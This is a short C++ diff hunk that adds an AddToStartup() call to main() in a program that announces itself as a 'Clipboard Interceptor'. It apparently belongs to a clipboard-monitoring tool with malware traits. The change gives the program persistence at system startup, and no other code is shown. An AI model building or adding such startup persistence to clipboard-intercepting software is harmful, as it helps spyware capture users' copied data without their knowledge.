@@ -32,6 +32,8 @@ void HandleNewData(std::string& data)
 }
 
 int main() {
+    AddToStartup();
+
     std::cout << "[*] Clipboard Interceptor Started\n";
     std::string lastClipboard = "";
 
